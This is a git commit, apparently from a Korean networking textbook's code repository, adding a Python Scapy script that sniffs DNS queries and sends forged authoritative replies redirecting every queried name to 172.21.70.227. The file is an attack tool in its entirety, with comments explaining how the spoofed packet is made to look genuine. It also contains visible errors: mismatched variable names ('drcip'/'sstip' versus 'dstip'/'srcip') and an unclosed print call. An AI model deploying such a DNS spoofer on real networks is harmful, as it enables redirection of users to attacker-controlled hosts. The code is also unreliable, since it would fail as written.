6c43f168ec89174366712de55d2a0be384597232
Arongbang <43198196+Arongbang@users.noreply.github.com>
2026-01-02 09:37:52 +0900

    6.20 소스코드 업로드

---
+++ 6장/6.20_dns_spoof0.py
@@ -0,0 +1,33 @@
+#DNS 응답 목적지 IP 주소 -> 가로챈 DNS 쿼리패킷의 발신지 IP 주소
+#DNS 발신지 IP 주소 -> 가로챈 DNS 쿼리패킷의 목적지 IP 주소
+#내가 보내는 변조된 패킷이 제대로 된 응답으로 보이게 하기 위함
+from scapy.all import *
+
+def dnsSpoof(packet):
+	spoofDNS = '172.21.70.227'
+	drcip = packet[IP].src
+	sstip = packet[IP].dst
+	sport = packet[UDP].sport
+	dport = packet[UDP].dport
+	
+	if packet.haslayer(DNSQR):
+		dnsid = packet[DNS].id
+		qd = packet[DNS].qd
+		#DNSRR의 rdata : DNS 응답 레코드
+		dnsrr = DNSRR(rrname=qd.qname, ttl=10, rdata=spoofDNS)
+		
+		spoofPacket = IP(dst=dstip, src=srcip)/UDP(dport=sport, sport=dport)/DNS(id=dnsid, qd=qd, aa=1, qr=1, an=dnsrr)
+		
+		send(spoofPacket)
+		
+		print('+++ SOURCE[%s] -> DEST[%s]' %(dstip, srcip)
+		print(spoofPacket.summary())
+	
+	
+def main():
+	print('+++DNS SPOOF START...')
+	sniff(filter='udp port 53', store=0, prn=dnsSpoof)
+	
+	
+if __name__ == '__main__':
+	main()
